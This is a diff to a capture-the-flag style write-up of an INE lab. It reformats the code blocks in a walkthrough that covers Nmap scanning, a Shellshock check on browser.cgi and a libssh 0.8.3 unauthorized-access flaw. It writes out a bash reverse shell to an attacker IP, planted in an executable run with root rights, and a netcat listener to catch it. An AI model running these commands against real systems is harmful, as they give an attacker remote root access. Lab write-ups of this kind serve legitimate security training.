@@ -13,10 +13,12 @@ nmap -sS -O -p80 -sV -T4 target1.ine.local
 
 A service scan reveals Apache 2.4.6 (Unix) on the target system.
 
-We proceed with a Dirb scan to enumerate possible useful folders. It finds cgi-dbin folder and the home page of the site named browser.cgi.
+We proceed with a Dirb scan to enumerate possible useful folders. It finds cgi-bin folder and the home page of the site named browser.cgi.
 This suggest we could attempt a Shellshocked vulnerability exploit.
 
-```nmap target1.ine.local --script http-shellshock --script-args "http-shellshock.uri=/browser.cgi"```
+```
+nmap target1.ine.local --script http-shellshock --script-args "http-shellshock.uri=/browser.cgi"
+```
 
 Nmap reveals that the file browser.cgi is vulnerable to Shellshock.
 
@@ -43,13 +45,19 @@ This flag is found during the previous step.
 
 Analyzing target 2, we scan it with Nmap. The scan leads us to port 22 and its service, libssh 0.8.3.
 
-```nmap target2.ine.local -p- -T4 -sS```
+```
+nmap target2.ine.local -p- -T4 -sS
+```
 
-```nmap target2.ine.local -p22 -T4 -sS -sV```
+```
+nmap target2.ine.local -p22 -T4 -sS -sV
+```
 
 Using:
 
-```searchsploit libssh```
+```
+searchsploit libssh
+```
 
 we discover that this particular version of libssh is vulnerable to unauthorized access.
 
@@ -72,11 +80,15 @@ Obtaining a root shell is not an easy task. However, there is an executable file
 
 We overwrite greetings with a file containing the following string:
  
-```bash -i >& /dev/tcp/192.164.224.2/41234 0>&1```
+```
+bash -i >& /dev/tcp/192.164.224.2/41234 0>&1
+```
 
 After using Netcat to open port on the attack machine to listen for communications:
 
-```nc -nlvp 41234```
+```
+nc -nlvp 41234
+```
 
 We execute welcome, that executes greetings, obtaining a root shell on the target machine.
 
